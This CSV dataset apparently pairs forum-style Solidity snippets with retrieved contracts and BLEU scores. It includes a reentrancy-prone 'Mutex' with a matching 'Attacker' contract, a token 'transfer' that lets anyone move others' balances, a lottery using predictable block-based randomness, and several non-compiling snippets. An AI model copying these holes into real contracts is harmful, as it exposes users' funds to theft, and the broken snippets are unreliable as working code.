sni,bleu,code
"contract VariableLength {

    event LogTest(bytes b);

    function test(bytes b) public returns(bool success) {
        LogTest(b);
        return true;
    }
}",0.6640111771598629,"contract DAppTest {

  bool public _is;

  function changeBoolean() public returns (bool success) {
    _is = !_is;
    return true;
  }

}"
"contract MyContract {
    bytes4 private constant FUNC_SELECTOR = bytes4(keccak256(""detectTransferRestriction(address,address,uint256)""));

    function callDetectTransferRestriction(address _token, address _to, address _from, uint256 _amount) public returns (bool) {
        bool success;
        bytes memory data = abi.encodeWithSelector(FUNC_SELECTOR, _to, _from, _amount);

        assembly {
            success := call(
                gas,            
                _token,         
                0,              
                add(data, 32),  
                mload(data),    
                0,              
                0               
            )
        }

        return success;
    }
}",0.656920900777587,"contract ERC23Basic is ERC20Basic {
    function transfer(address _to, uint256 _value, bytes _data) public returns (bool success);
    function contractFallback(address _origin, address _to, uint _value, bytes _data) internal returns (bool success);
    function isContract(address _addr) internal returns (bool is_contract);
    event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes indexed _data);
}"
"contract MyContract {
  address token_address = 

  function hasTokens() public returns (bool) {
    let balance = ERC20(token_address).balanceOf(msg.sender);
    return (balance > 0);
  }

}",0.6904272740236798,"contract ERC20 {
  function balanceOf(address owner) constant returns (uint balance);
  function transfer(address to, uint value) returns (bool success);
}"
"contract Example {

    struct Store {
        string id;         
        uint time;         
    }

    mapping (string => Store) public purchases;

    function set(string memory _id, uint _time) public returns(bool) {
        purchases[msg.sender].id = _id;
        purchases[msg.sender].time = _time;
        return true;
    }

    function get() public view returns(Store memory) {
        return purchases[msg.sender];
    }
}",0.6809139642867033,"contract AOQUtil {

    function getLevel(uint value) public view returns (uint);

    function getStaticCoefficient(uint level) public pure returns (uint);

    function getRecommendCoefficient(uint times) public pure returns (uint);

    function compareStr(string memory _str, string memory str) public pure returns (bool);

}"
"contract Reason {

    function doSomething() public pure {
        require(false, ""Just because"");
    }
}",0.6384923530810831,"contract ErrorReporter {

    function report(string reason) public pure {

        revert(reason);

    }

}"
"contract Test {
  address testAddress;
  constructor() {
    testAddress = msg.sender;
  }

  
  function test() public {
    require(msg.sender == testAddress);

  }
}",0.6825713416496638,"contract Owned {
    address owner;
    
    function constuctor() public {
        owner = msg.sender;
    }
    
	modifier onlyOwner {
		require(msg.sender == owner);
		_;
	}
}"
"contract Token {
    address [] public voters;

    function Token(address first_voter) {
        voters.push(first_voter);
    }
}",0.6393737397502466,"contract TokenList {

    function isTokenInList(address tokenAddress) public constant returns (bool);

}"
"contract Vote{
     
     

    function check_first_voter() returns (address) {
        Token token = new Token(0x123);
        address valid_voter = token.voters(0);  

        
        assert(valid_voter == 0x123);
        
        return valid_voter;
    }
}",0.6011480815267185,"contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}"
"contract Item {
    Item public next;
    address owner;

    constructor(Item _next) public {
        owner = msg.sender;
        if (_next == Item(0)) {
            next = this;
        } else {
            next = _next;
        }
    }

    function addNew(Item item) public {
        require(msg.sender == owner);
        next = item;
    }
}",0.6743911879976956,"contract Owned {
    address public owner;

    	
    constructor() public {
        owner = msg.sender;
    }	

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
}"
"contract SalesContract {

    address payable public owner;
    bool public isSold = false;
    string public salesDescription = ""Honda Civic"";
    uint public price = 2 ether;

    constructor() public {
        owner = msg.sender;
    }

    function Buy() public payable {
        if(msg.value >= price) {
            owner.transfer(address(this).balance);
            owner = msg.sender;
            isSold = true;
        } else {
            revert();
        }
    }

}",0.6858653899808437,"contract Name{
    address public owner = msg.sender;
    string public name;

    modifier onlyBy(address _account) { require(msg.sender == _account); _; }


    function Name(string myName) public {
      name = myName;
    }

    function() payable public {}

    function withdraw() onlyBy(owner) public {
      owner.transfer(this.balance);
    }

    function destroy() onlyBy(owner) public{
      selfdestruct(this);
    }
}"
"contract TestInt {
    uint value1;
    function setVal(uint _value) public {
      value1 = _value + 10;
    }

    function getVal() public  returns (uint) {
      return value1;
    }

    int value2;
    function set2(int _value) public {
      value2 = _value + 10;
    }

    function get2() public  returns (int) {
      return value2;
    }
    uint value;
  }",0.6665101711664565,"contract Nonce {
    event IncrementEvent(address indexed _sender, uint256 indexed _newNonce);
    uint256 value;
    
    function increment() public returns (uint256) {
        value = ++value;
        emit IncrementEvent(msg.sender, value);
        return value;
    }
    
    function getValue() public view returns (uint256) {
        return value;
    }
}"
"contract HoldOff {
    address public owner;

    event LogRequest(
        address requester,
        address target,
        bytes msgData);

    function HoldOff() {
        owner = msg.sender; 
    }

    function requestCall(address target, bytes msgData) 
        returns (bytes32 key) {
        LogRequest(msg.sender, target, msgData);
    }

    function doCall(address target, bytes msgData) 
        returns (bool) {
        if (owner != msg.sender) throw;
        return target.call(msgData);
    }
}",0.6258451478468195,"contract generic_holder {
    address owner;
    
    modifier onlyowner {
        if (owner == msg.sender)
            _;
    }
    
    
    function generic_holder() {
        owner = msg.sender;
    }
    
    function change_owner(address new_owner) external onlyowner {
        owner = new_owner;
    }
    
    function execute(address _to, uint _value, bytes _data) external onlyowner returns (bool){
        return _to.call.value(_value)(_data);
    }
    
    function get_owner() constant returns (address) {
        return owner;
    }
}"
"contract NewHello {

    mapping(address => string) public users; 

    function updateUser(string memory name) public {
        require(bytes(users[msg.sender]).length == 0);
        users[msg.sender] = name; 
    }

    function getUser(address userAddress) public view returns(string memory) {
        return users[userAddress]; 
    }
}",0.6383329968833779,"contract License {
    
    mapping (address => bool) signatories;
    
    function sign() public {
        signatories[msg.sender] = true;
    }
        
    function unsign() public {
        signatories[msg.sender] = false;
    }
        
    function did_address_sign(address _address) public view returns (bool) {
        return signatories[_address];
    }
}"
"contract Tenant {
    address tenant;
    uint256 rent;

    function Tenant(address _tenant) {
        tenant = _tenant;
    }

    function setRent(uint256 _rent) {
        rent = _rent;
    }
}",0.6303550433378834,"contract token {
    function transfer(address receiver, uint256 amount);
    function balanceOf(address _owner) constant returns (uint256 balance);
}"
"contract Landlord is User {
    string public landlordName;
    string public physicalAddress;

    function Landlord(
      string _name,
      string _physicalAddress) {
        landlordName = _name;
        physicalAddress = _physicalAddress;
    }

    function setRent(uint256 _rent, address _tenantAddress){
        Tenant person = Tenant(_tenantAddress);
        person.setRent(_rent);
    }
}",0.6148394168760627,"contract ComponentContainerInterface {

    mapping (string => address) components;



    event ComponentUpdated (string _name, address _componentAddress);



    function setComponent(string _name, address _providerAddress) internal returns (bool success);

    function getComponentByName(string name) public view returns (address);



}"
"contract C {
    function f() public {
        
        
        uint[] x = [uint(1), 3, 4];
    }
}",0.6926107863094819,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract Caller {

  test public t;

  
  

  function Caller(address tAddress) {
    t = test(tAddress); 
  }

  function callIt(address theAddress)
    public
    returns(uint bal)
  {
      return t.FunctionX(theAddress);
  }
}",0.6729237174450783,"contract WhiteList {
	function register(address _address) public;
	function unregister(address _address) public;
	function isRegistered(address _address) public view returns(bool);	
}"
"contract OwnedToken {
    
    
    
    TokenCreator creator;
    address owner;
    bytes32 name;

    
    
    constructor(bytes32 _name) public {

        owner = msg.sender;
        name = _name;

        
        
        
        
        
        creator = TokenCreator(msg.sender);

    }

    function transfer(address newOwner) public {
        if (msg.sender != owner) return;

        
        
        
        
        
        if (creator.isTokenTransferOK(owner, newOwner))
            owner = newOwner;
    }

    [...rest snipped...]
}",0.6905942250751301,"contract StorexOwner {
	address public owner;
	
	event OwnershipTransferred(address indexed _from, address indexed _to);
	
	constructor() public {
		owner = msg.sender;
	}
	
	modifier isOwner {
		require(msg.sender == owner);
		_;
	}
	
	function transferOwnership(address _newOwner) public isOwner {
		owner = _newOwner;
		emit OwnershipTransferred(msg.sender, _newOwner);
	}
}"
"contract Cast {

    function weirdResult() public pure returns(uint) {
        uint8 y = 3;
        uint8 x = 10;
        return x**y;
    }
}",0.6926044529323084,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Test {
    function test(bytes32 data) external pure returns (address) {
        return address(uint160(uint256(data)));
    }
}",0.6618230893469699,"contract Kyber {

	function searchBestRate(address, address, uint256, bool) external view returns(address, uint256) {}

}"
"contract Test {
  
  event Paid(address indexed _from, uint _value);

  
  
  function () external payable {
    Paid(msg.sender, msg.value);
  }
}",0.6825465431526208,"contract Vote {
    event LogVote(address indexed addr);

    function() {
        LogVote(msg.sender);

        if (msg.value > 0) {
            msg.sender.send(msg.value);
        }
    }
}"
"contract Lottery {
    address public manager;
    address[] public players;
    address tokenAddress;

    function Lottery() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether);

        players.push(msg.sender);
    }

    function provideService() external payable {
        uint amount = msg.value;
        ERC20Interface tokenContract = ERC20Interface(tokenAddress);
        require(tokenContract.transferFrom(msg.sender, this, amount));
        
        players.push(msg.sender);
    }

    function random() private view returns (uint) {
        return uint(keccak256(block.difficulty, now, players));
    }

    function pickWinner() public restricted {
        ERC20Interface tokenContract = ERC20Interface(tokenAddress);
        
        uint contractBalance = tokenContract.balanceOf(address(this)); 
        uint index = random() % players.length;
        
        tokenContract.transfer( players[index], contractBalance / 2 );
        
        address treasury;
        tokenContract.transfer( treasury, contractBalance / 2 );
        
        players = new address[](0);
    }

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

    function getPlayers() public view returns (address[]) {
        return players;
    }
}",0.6308287371747574,"contract PrivateSale is Ownable {

   LamdenTau public lamdenTau;
   address public buyer;

   uint256 public priceInWei;

   function PrivateSale(address _tokenContractAddress, address _buyer, uint256 _priceInWei) public {

      require(_buyer != address(0));
      require(_tokenContractAddress != address(0));
      require(_priceInWei > 0);

      buyer = _buyer;
      priceInWei = _priceInWei;
      lamdenTau = LamdenTau(_tokenContractAddress);
   }

   function buyTokens() public payable {
      require(msg.sender == buyer);
      require(msg.value >= priceInWei);

      transferWeiToWallet();
      issueTokensToBuyer();
   }
   
   function () public payable {
       buyTokens();
   }

   function transferWeiToWallet() internal  {
      owner.transfer(msg.value);
   }

   event IssueTokens(address indexed to, uint256 weiValue, uint256 amountOfTokens);

   function issueTokensToBuyer() internal  {

      uint256 balance = lamdenTau.balanceOf(this);
      require(balance > 0);
      assert(lamdenTau.transfer(buyer, balance));
      IssueTokens(buyer, priceInWei, balance);
   }

   function endTokenSale() onlyOwner {

      uint256 balance = lamdenTau.balanceOf(this);
      require(balance > 0);
      assert(lamdenTau.transfer(owner, balance));
   }
}"
"contract Test {
    address[] public addrs;
    mapping (address => uint256) public something;
    mapping (address => bool) public registered;
    function registerSomething(address _addr, uint256 _value) {
        require(!registered[_addr]);
        registered[_addr] = true;
        addrs.push(_addr);
        something[_addr] = _value;
    }
}",0.6729501791733605,"contract AddressBook {



    mapping(address => uint32) public uidOf;

    mapping(uint32 => address) public addrOf;



    uint32 public topUid;



    function address_register(address _addr) internal {

        require(uidOf[_addr] == 0, 'addr exsists');

        uint32 uid = ++topUid;

        uidOf[_addr] = uid;

        addrOf[uid] = _addr;

    }

}"
"contract Contract2 {

    Contract1 public contract1 = new Contract1();

    function func() public returns (uint32, uint32) {

        uint32[2] memory ret;

        address dest = address(contract1);

        bytes4 selector = contract1.func.selector;
        

        bytes memory data = abi.encodeWithSelector(selector, uint256(789), uint8(123));
        (bool success, ) = dest.call(data);
        require(success);

        assembly {
            let size := returndatasize
            returndatacopy(ret, 0, size)
        }
        return (ret[0], ret[1]);
    }
}",0.6296884834223659,"contract Proxy {

  function implementation() public view returns (address);



  

  function () payable public {

    address impl = implementation();

    require(impl != address(0));

    bytes memory data = msg.data;



    assembly {

      let result := delegatecall(gas, impl, add(data, 0x20), mload(data), 0, 0)

      let size := returndatasize



      let ptr := mload(0x40)

      returndatacopy(ptr, 0, size)



      switch result

      case 0 { revert(ptr, size) }

      default { return(ptr, size) }

    }

  }

}"
"contract Contract {
    uint[] public large_array;

    function read(uint cursor, uint length) public view returns (uint[] memory) {
        uint[] memory array = new uint[](length);
        for (uint i = cursor; i < cursor+length; i++) {
            array[i] = large_array[i];
        }
        return array;
    }
}",0.6159538961424518,"contract BalanceChecker {

  function balances(address[] calldata users) external view returns (uint[] memory) {
    uint[] memory addrBalances = new uint[](users.length);
    
    for(uint i = 0; i < users.length; i++) {
        addrBalances[i] = users[i].balance;
    }
  
    return addrBalances;
  }

}"
"contract Case1 {

    struct BB{
        mapping (uint => address) map_2;
    }

    mapping (uint => BB) map_1; 

    function getter(uint structId, uint mapId) public view returns(address) {
        return map_1[structId].map_2[mapId];
    }  
}",0.6237195279454623,"contract FeeInterface {
    function rateOf (address token) public view returns (uint);
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract B {
    function create() public {
        A newContract = new A();
    }
}",0.6436968210160234,"contract callBackContract {

    function __response(uint _price) public;

}"
"contract InterfaceOfB {
        function g(bool) returns (bool);
}",0.6823135006907421,"contract TUB {
    function off() public returns(bool);
}"
"contract A is InterfaceOfA {
        InterfaceOfB b;
        function f(uint _input) returns (uint) {
                b.g(true);
                return 3;
        }
}",0.6654658497799388,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract B is InterfaceOfB {
        InterfaceOfA a;
        function g(bool _input) returns (bool) {
                a.f(0);
                return false;
        }
}",0.6246004589917111,"contract Test {

    function A() public pure returns (bool) {

        require(false, ""you shall not pass"");

        return true;

    }

}"
"contract B is IB {
    IA public a;
    function set(IA _a) external {a = _a;}
    
}",0.6025372057491915,"contract ICEther is ICToken {
    function mint() external payable returns (uint);
}"
"contract A is Owned{ 
  B public b;
  function A()
  Owned(msg.sender)
  { 
    b = new B(msg.sender); 
  }
}",0.6500759536653333,"contract Owned {
    address public Owner = msg.sender;
    modifier onlyOwner { if (msg.sender == Owner) _; }
}"
"contract B is Owned  {
  address parent;
  function B(address _owner)
  Owned(_owner)
  {
    parent = msg.sender;
  }  
}",0.6869420343653839,"contract OwnableStorage {

  address public owner;

  function OwnableStorage() internal {
    owner = msg.sender;
  }

}"
"contract game {

 struct users{
     string name;
     uint level;
     uint score;
 }

 mapping(uint => users[]) mulusers;

 function addusers (uint id, string _name, uint _level, uint _score) public {
     users memory user= users(_name,_level,_score); 
     mulusers[id].push(user);
 }

 function getusers (uint _id) public view returns (string){

    uint index= mulusers[_id].length;

     for(uint i=0; i<index; i++){       
       return mulusers[_id][i].name; 
     }   
  }   
}",0.6208263675915304,"contract UserName {



  mapping (address => mapping (uint => string)) public userDict;



  event OnNameChanged(uint indexed _guid, address indexed _who, string _newName);



  function changeName(uint _guid, string _newName) public {

    userDict[msg.sender][_guid] = _newName;

    OnNameChanged(_guid, msg.sender, _newName);

  }



  function nameOf(uint _guid, address _who) view public returns (string) {

    return userDict[_who][_guid];

  }

}"
"contract C {
    uint256 public value = 500;
    address b;

    constructor(address _b) {
        b = _b;
    }

    function delegate() public {
        address orgB = b;
        if (b.a != address(0)) {
            b = b.a;
        }
        orgB.delegatecall(bytes4(keccak256(""delegate()"")));
        b = orgB;
    }
}",0.6113145284473628,"contract TokenController {

    bytes4 public constant INTERFACE = bytes4(keccak256(""TokenController""));



    function allowTransfer(address _sender, address _from, address _to, uint256 _value, bytes _purpose) public returns (bool);

}"
"contract Mutex {
    bool locked;
    modifier noReentrancy() {
        require(!locked);
        locked = true;
        _;
        locked = false;
    }

    function Mutex() public payable { }

    function canBeAttacked() public returns (uint) {
        require(msg.sender.call.value(1 ether)());
        return 7;
    }

    
    function f() public noReentrancy returns (uint) {
        require(msg.sender.call());
        return 7;
    }
}",0.6577327746142102,"contract Lockable is Owned {
    bool public isLocked = false;
    
    modifier checkLock(address from) {
        require(!isLocked || from == owner);
        _;
    }
    
    function lock() public onlyOwner returns (bool success) {
        isLocked = true;

        return true;
    }
    function unLock() public onlyOwner returns (bool success) {
        isLocked = false;

        return true;
    }
}"
"contract Attacker {
    function () public payable {
        if (msg.sender.balance >= 1 ether) {
            Mutex(msg.sender).canBeAttacked();
        }
    }

    function payment(Mutex mutex) public {
        mutex.canBeAttacked();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}",0.65348868013258,"contract MyCompanyWallet is Ownable {

    address public Owner;

    

    function setup() public payable {

        if (msg.value >= 0.5 ether) {

            Owner = msg.sender;

        }

    }

    

    function withdraw() public {

        if (isOwner()) {

            msg.sender.transfer(address(this).balance);

        }

    }

    

    function() public payable { }

}"
"contract Div {

    function divider(uint numerator, uint denominator, uint precision) public pure returns(uint) {
        return (numerator*(uint(10)**uint(precision+1))/denominator + 5)/uint(10);
    }
}",0.6851944269422043,"contract Revolution {

  function dividendsPercent() public view returns(uint numerator, uint denominator);

  function latestPayout() public view returns(uint timestamp) ;

}"
"contract TestCoin {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function TestCoin(uint256 initialSupply) public {
    totalSupply = initialSupply;
    balanceOf[msg.sender] = totalSupply;
  }
}",0.6824853002556222,"contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  uint256 totalSupply_;

  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }

}"
"contract Autos {

address owner;
address[] members;
uint counter = 1;
mapping (address => bool) public owners;

constructor() public {
    owner = msg.sender;
    members = [0xca35b7d915458ef540ade6068dfe2f44e8fa733c,0x14723a09acff6d2a60dcdf7aa4aff308fddc160c];
    for (uint i=0; i lessthan members.length ; i++)
    {
     owners[members[i]]=true;
   }
}

function incCounter() onlyOwner {
       counter++;
   }
    function showCount() view returns(uint){
        return counter;
    }

modifier onlyOwner {
    require(owners[msg.sender]);
_;

}  
}",0.6491300735951874,"contract Ownable is WaConfig {

    address public ceo;

    

    event LogChangeCEO(address indexed oldOwner, address indexed newOwner);

    

    modifier onlyOwner {

        require(msg.sender == ceo);

        _;

    }

    

    constructor() public {

        ceo = msg.sender;

    }

    

    function changeCEO(address _owner) onlyOwner public returns (bool) {

        require(_owner != address(0));

        

        emit LogChangeCEO(ceo, _owner);

        ceo = _owner;

        

        return true;

    }



    function isOwner(address _owner) internal view returns (bool) {

        return ceo == _owner;

    }

}"
"contract B is A {
    address private owner;
    uint state;
    constructor() public {
        owner = msg.sender;
        state = 0;
    }
    function getOwner() internal returns(address) {
        return owner;
    }
    function performOperation() internal {
        state = state + 1;
    }
}",0.6926951456569778,"contract Owned is DBC {

    

    address public owner;

    

    function Owned() { owner = msg.sender; }

    function changeOwner(address ofNewOwner) pre_cond(isOwner()) { owner = ofNewOwner; }

    

    function isOwner() internal returns (bool) { return msg.sender == owner; }

}"
"contract Test {

    enum assetState{something}

    mapping(uint256 => asst) assetsById;

    struct asst {
        uint256 assetId;
        uint256 next;
        uint256 prev;
        uint256 timestampCreation;
        address assetOwner;
        address issuer;
        string content;
        uint256 sellPrice;
        assetState state;
    }

    function getAssetStructById(uint256 assetId) public view returns (asst _asset) {
        return (assetsById[assetId]);
    }

    function tryIt(uint id) public view returns(bool success) {
        asst memory a = getAssetStructById(id); 
        return true;
    }
}",0.6135788174191613,"contract NatminVesting is Ownable {

    struct Vesting {        

        uint256 amount;

        uint256 endTime;

    }

    mapping(address => Vesting) internal vestings;



    function addVesting(address _user, uint256 _amount, uint256 _endTime) public ;

    function getVestedAmount(address _user) public view returns (uint256 _amount);

    function getVestingEndTime(address _user) public view returns (uint256 _endTime);

    function vestingEnded(address _user) public view returns (bool) ;

    function endVesting(address _user) public ;

}"
"contract OtherContract {
    function otherMethod(address _to, uint _price);
}",0.696203991635386,"contract MCTContract {
  function mintTokens(address _to, uint256 _amount);
}"
"contract Betting is usingOraclize {

event Transfer(address _from, uint256 _value);
function Betting() {

}

function () payable {
   Transfer(msg.sender, msg.value);
}

}",0.6621002646718142,"contract TokenUSDT {
  function transferFrom(address _from, address _to, uint256 _value) public  {}
  function transfer(address _to, uint256 _value) public  {}
}"
"contract SP {
    IValidator validator;
    ...
    function verifyHash(bytes32 hash) external view returns (address) {
        return validator.verifyHash(hash);
    }
}",0.6090644873766898,"contract GetBAU is DataCaller {

    function getBAU(bytes32 _key, address _addr) internal view returns(uint256) {

        return data.bau(_key, _addr);        

    }

}"
"contract TruffleDebug {

  function Deposit (uint256 timeout, bytes32 hash, address recipient) public payable returns (uint256)  {
       emit AcceptCommitted(timeout, hash, recipient);
       return 1;
   }

   event AcceptCommitted(uint256 indexed timeout, bytes32 indexed hash, address indexed recipient);

}",0.6102693514183258,"contract ERC20Token {
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Burn(address indexed from, uint256 value);
}"
"contract MyToken {
    mapping (address => uint) balanceOf;

    event CoinTransfer(address indexed _from, address indexed _to, uint256 _value);

    function MyToken() {
        balanceOf[msg.sender] = 21000000;
    }

    function sendCoin(address receiver, uint amount) returns(bool sufficient) {
        if (balanceOf[msg.sender] < amount) return false;
        balanceOf[msg.sender] -= amount;
        balanceOf[receiver] += amount;
        CoinTransfer(msg.sender, receiver, amount);
        return true;
    }

    function transfer(address from, address to, uint amount) returns(bool sufficient) {
        if (balanceOf[from] < amount) return false;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        CoinTransfer(from, to, amount);
        return true;
    }

    function getBalance(address addr) returns(uint) {
        return balanceOf[addr];
    }
}",0.6824846027095823,"contract ERC20Token {

    
    event Transfer(address indexed _from, address indexed _to, uint256 _amount);

    
    event Approval(address indexed _owner, address indexed _recipient, uint256 _amount);

    function totalSupply() public constant returns (uint256);
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _recipient, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _recipient) public constant returns (uint256 remaining);
}"
"contract PermService {
    mapping (address => bool) customerPaid;
    address vendor;

    function PermService() {
        vendor = msg.sender;
    }

    function buy(address tokenContractAddress) returns (bool success) {
        if (customerPaid[msg.sender]) {
            
            return true;
        }
        MyToken mt = MyToken(tokenContractAddress);
        if (mt.getBalance(msg.sender) < 5) {
            throw;
            return false;
        }
        mt.transfer(msg.sender, vendor, 5);
        customerPaid[msg.sender] = true;
        return true;
    }
}",0.6259183195544376,"contract GBank {

    address creator;

    mapping (address => uint) balances;

    function GBank(uint startAmount) {
        balances[msg.sender] = startAmount;
        creator = msg.sender;
    }

    function getBalance(address a) constant returns (uint) {
        return balances[a];
    }

    function transfer(address to, uint amount) {

        
        if (msg.sender == to) {
            throw;
        }

        
        if (amount > balances[msg.sender]) {
            throw;
        }

        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}"
"contract OnetimeService {
    address vendor;

    function OnetimeService() {
        vendor = msg.sender;
    }

    function buy(address tokenContractAddress) returns (bool success) {
        MyToken mt = MyToken(tokenContractAddress);
        if (mt.getBalance(msg.sender) < 2) {
            return false;
        }
        mt.sendCoin(vendor, 2);

        return true;
    }

}",0.6286822243430539,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
"contract Mutex {
  bool locked;
modifier noReentrancy() {
    require(!locked);
    locked = true;
    _;
    locked = false;
}

  function canBeAttacked() public returns (uint) {
    require(msg.sender.call.value(1 ether)());
   return 7;
  }


  function f() public noReentrancy returns (uint) {
    require(msg.sender.call());
   return 7;
  }
}",0.6127940601823935,"contract Owned {

  address owner;
  uint last_blocknumber;

  
  function Owned() public {
    owner = msg.sender;
  }
  
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;

  }

  function close() public onlyOwner {
    selfdestruct(msg.sender);
  }
}"
"contract Contract {
 string ipfsHash;
 mapping (address => string[]) userToFiles;
 event (string ipfsHash, address owner) filesUploaded;

 function setHash(string x) public {
   ipfsHash = x;
   
   
 }

 function getHash() public view returns (string x) {
   return ipfsHash;
 }
}",0.626279249701572,"contract Register is Pausable {
    mapping(address => string) public registry;

    
    function addUser(string info) public whenNotPaused {
        registry[msg.sender] = info;
    }
   
    
    function getInfo(address ethAddress) public constant returns (string) {
        return registry[ethAddress];
    }
}"
"contract Test {
    uint[] public arr;
    uint[] public arr1;

    constructor() public {
        arr = [1];
        arr1 = [2];
    }

    function setMe() public {
        TestLibrary.setMyArray(arr, arr1);
    }
}",0.6048320998226887,"contract Pause is Owned {
	uint8 public pause;

	constructor() public {
		pause = 0;
	}

	function setPause(uint8 _pause) onlyOwner public {
		pause = _pause;
	}
}"
"contract Test {

    address public constant MY_ADDRESS = msg.sender;

    function check() constant returns (address) {
        return MY_ADDRESS;
    }
}",0.6869127099108835,"contract IOwnership {

    
    function isOwner(address _account) constant returns (bool);


    
    function getOwner() constant returns (address);
}"
"contract ColorPallet {

  address public owner; 

  
  bytes32[] public colors;

  mapping(address => uint) public userColorChoices;
  mapping(address => bool) public userHasSelectedColor;

  modifier onlyOwner() {
    if(msg.sender != owner) throw;
    _;
  }

  function ColorPallet() {
    owner = msg.sender;
  }

  
  function newColor(bytes32 colorName) 
    onlyOwner
    returns(uint index) 
  {
    colors.push(colorName);
    return colors.length-1;
  }

  

  function setUserColor(uint colorId) 
    public
  {
    if(colorId >= getColorCount()) throw; 
    userColorChoices[msg.sender] = colorId; 
    userHasSelectedColor[msg.sender] = true;
  }

  function getColorCount() 
    public
    constant
    returns(uint count) 
  {
    return colors.length;
  }

  function newUserContract() 
    public
    returns(address newUserContract)
  {
    User u = new User(msg.sender, this);  
    return u;
  }
}",0.629148505337872,"contract MultiOwners {

    event AccessGrant(address indexed owner);
    event AccessRevoke(address indexed owner);
    
    mapping(address => bool) owners;
    address public publisher;

    function MultiOwners() public {
        owners[msg.sender] = true;
        publisher = msg.sender;
    }

    modifier onlyOwner() { 
        require(owners[msg.sender] == true);
        _; 
    }

    function isOwner() public constant returns (bool) {
        return owners[msg.sender] ? true : false;
    }

    function checkOwner(address maybe_owner) public constant returns (bool) {
        return owners[maybe_owner] ? true : false;
    }

    function grant(address _owner) onlyOwner public {
        owners[_owner] = true;
        AccessGrant(_owner);
    }

    function revoke(address _owner) onlyOwner public {
        require(_owner != publisher);
        require(msg.sender != _owner);

        owners[_owner] = false;
        AccessRevoke(_owner);
    }
}"
"contract User {

  address public owner; 
  address public pallet;
  uint    public myColor;

  ColorPallet c;

  modifier onlyOwner() {
    if(msg.sender != owner) throw;
    _;
  }

  function User(address userOwner, address pallet) {
    
    owner = userOwner;
    
    c = ColorPallet(pallet);
  }

  function selectColor(uint colorId) 
    
    returns(bool success)
  {
    myColor = colorId;                      
    c.setUserColor(colorId);                
    return true;
  }

}",0.6557959799886366,"contract CENAuth{

	address public owner;

	constructor () public{

		owner = msg.sender;

	}

	event LogOwnerChanged (address msgSender );



	

	modifier onlyOwner{

		assert(msg.sender == owner);

		_;

	}



	function setOwner (address newOwner) public onlyOwner returns (bool){

		if (owner == msg.sender){

			owner = newOwner;

			emit LogOwnerChanged(msg.sender);

			return true;

		}else{

			return false;

		}

	}



}"
"contract A {

   uint public bidValue;
   address public bidder;

   function bid() public payable {
     bidValue = msg.value;    
     bidder = msg.sender;
   }
}",0.6865311215537448,"contract PayChannel {

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function () payable public {
        owner.transfer(msg.value);
    }
}"
